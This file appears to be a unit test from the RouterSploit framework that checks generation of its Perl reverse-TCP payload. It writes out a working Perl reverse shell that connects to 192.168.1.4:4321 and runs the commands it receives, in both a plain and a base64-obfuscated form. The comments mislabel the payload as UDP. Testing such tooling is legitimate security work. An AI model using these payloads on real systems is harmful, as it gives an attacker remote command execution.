from routersploit.modules.payloads.perl.reverse_tcp import Payload


# reverse udp payload with lhost=192.168.1.4 lport=4321
reverse_tcp = (
    "use IO;foreach my $key(keys %ENV){" +
    "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" +
    "192.168.1.4:4321" +
    "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};"
)

# reverse udp payload with lhost=192.168.1.4 lport=4321 encoded with perl/base64
reverse_tcp_encoded = (
    "use MIME::Base64;eval(decode_base64('dXNlIElPO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxOTIuMTY4LjEuNDo0MzIxIik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3doaWxlKDw+KXtpZigkXz1+IC8oLiopLyl7c3lzdGVtICQxO319Ow=='));"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.generate() == reverse_tcp
    assert payload.run() == reverse_tcp_encoded
